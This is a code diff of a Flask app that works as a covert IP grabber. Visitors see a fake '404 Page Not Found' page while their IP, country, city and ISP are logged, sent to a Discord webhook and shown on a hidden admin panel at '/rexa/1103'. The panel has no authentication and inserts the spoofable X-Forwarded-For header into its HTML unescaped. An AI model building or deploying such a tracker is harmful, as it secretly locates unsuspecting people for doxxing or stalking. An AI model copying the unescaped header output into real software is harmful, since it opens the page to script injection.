@@ -2,10 +2,14 @@ from flask import Flask, request
 import sqlite3
 from datetime import datetime, timedelta
 import requests
+import os
 
 app = Flask(__name__)
 
-# ---------------- DB ----------------
+# 🔐 Discord webhook (Render ENV'den alınır)
+DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")
+
+# DB
 def init_db():
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
@@ -17,7 +21,8 @@ def init_db():
             sehir TEXT,
             isp TEXT,
             tarih TEXT,
-            saat TEXT
+            saat TEXT,
+            timestamp DATETIME
         )
     """)
     conn.commit()
@@ -25,104 +30,120 @@ def init_db():
 
 init_db()
 
-# ---------------- IP BİLGİ ----------------
+
+# IP info
 def ip_bilgi(ip):
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp")
-        data = r.json()
-        if data["status"] == "success":
-            return data["country"], data["city"], data["isp"]
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3)
+        d = r.json()
+        if d["status"] == "success":
+            return d["country"], d["city"], d["isp"]
     except:
         pass
     return "Bilinmiyor", "Bilinmiyor", "Bilinmiyor"
 
-# ---------------- EKLE (30 DK KORUMA) ----------------
-def ekle(ip):
-    now = datetime.now()
+
+# 30 dk kontrol
+def son_30dk(ip):
     conn = sqlite3.connect("data.db")
     c = conn.cursor()
+    c.execute("SELECT timestamp FROM logs WHERE ip=? ORDER BY id DESC LIMIT 1", (ip,))
+    row = c.fetchone()
+    conn.close()
 
-    # son kayıt
-    c.execute("SELECT tarih, saat FROM logs WHERE ip=? ORDER BY id DESC LIMIT 1", (ip,))
-    last = c.fetchone()
+    if not row:
+        return False
 
-    if last:
-        last_time = datetime.strptime(last[0] + " " + last[1], "%Y-%m-%d %H:%M:%S")
-        if now - last_time < timedelta(minutes=30):
-            conn.close()
-            return
+    last = datetime.fromisoformat(row[0])
+    return datetime.now() - last < timedelta(minutes=30)
 
+
+# LOG
+def ekle(ip):
+    if son_30dk(ip):
+        return
+
+    now = datetime.now()
     ulke, sehir, isp = ip_bilgi(ip)
 
-    c.execute(
-        "INSERT INTO logs (ip, ulke, sehir, isp, tarih, saat) VALUES (?, ?, ?, ?, ?, ?)",
-        (ip, ulke, sehir, isp, now.strftime("%Y-%m-%d"), now.strftime("%H:%M:%S"))
-    )
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+    c.execute("""
+        INSERT INTO logs (ip, ulke, sehir, isp, tarih, saat, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?, ?)
+    """, (ip, ulke, sehir, isp,
+          now.strftime("%Y-%m-%d"),
+          now.strftime("%H:%M:%S"),
+          now.isoformat()))
     conn.commit()
     conn.close()
 
-# ---------------- LİSTE ----------------
-def getir():
-    conn = sqlite3.connect("data.db")
-    c = conn.cursor()
-    c.execute("SELECT ip, ulke, sehir, isp, tarih, saat FROM logs ORDER BY id DESC")
-    data = c.fetchall()
-    conn.close()
-    return data
+    # Discord log
+    if DISCORD_WEBHOOK:
+        try:
+            requests.post(DISCORD_WEBHOOK, json={
+                "content": f"📡 Ziyaret\nIP: {ip}\nÜlke: {ulke}\nŞehir: {sehir}\nISP: {isp}\nSaat: {now.strftime('%H:%M:%S')}"
+            })
+        except:
+            pass
 
-# ---------------- ANA SAYFA (IP KAYIT BURADA) ----------------
+
+# HOME (404)
 @app.route("/")
 def home():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     ip = ip.split(",")[0].strip()
 
-    ekle(ip)  # 🔥 BURASI EN ÖNEMLİ
+    ekle(ip)
 
     return """
-    <html>
-    <body style="background:black;color:white;text-align:center;font-family:Arial;padding-top:100px;">
-        <h1>ERROR 404</h1>
-        <p>Page Not Found</p>
-        <p style="font-size:12px;color:gray;">
-            The page you are looking for might have been removed,<br>
-            had its name changed, or is temporarily unavailable.
-        </p>
+    <body style="background:black;color:white;text-align:center;font-family:monospace;padding-top:100px;">
+        <h1>404</h1>
+        <p>PAGE NOT FOUND</p>
+        <small style="color:gray;">
+            The requested URL was not found on this server.<br>
+            Please check the URL or try again later.
+        </small>
     </body>
-    </html>
     """, 404
 
-# ---------------- ADMIN PANEL ----------------
+
+# ADMIN PANEL
 @app.route("/rexa/1103")
 def admin():
-    data = getir()
+    conn = sqlite3.connect("data.db")
+    c = conn.cursor()
+    c.execute("SELECT ip, ulke, sehir, isp, tarih, saat FROM logs ORDER BY id DESC")
+    data = c.fetchall()
+    conn.close()
 
     html = """
     <html>
     <head>
         <meta http-equiv="refresh" content="5">
-        <title>ADMIN PANEL</title>
         <style>
             body { background:#0a0a0a; color:#00ff00; font-family:monospace; padding:20px; }
             .box { border-bottom:1px solid #222; padding:10px; }
+            .ip { color:#00ffcc; }
         </style>
     </head>
     <body>
-        <h2>IP LOGS</h2>
+    <h2>ADMIN PANEL</h2>
     """
 
-    for ip, ulke, sehir, isp, tarih, saat in data:
+    for i in data:
         html += f"""
         <div class="box">
-            IP: {ip} <br>
-            Ülke: {ulke} | Şehir: {sehir} <br>
-            ISP: {isp} <br>
-            Tarih: {tarih} {saat}
+            <div class="ip">IP: {i[0]}</div>
+            <div>Ülke: {i[1]} | Şehir: {i[2]}</div>
+            <div>ISP: {i[3]}</div>
+            <div>{i[4]} {i[5]}</div>
         </div>
         """
 
     html += "</body></html>"
     return html
 
-# ---------------- RUN ----------------
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+    app.run(host="0.0.0.0", port=5000)
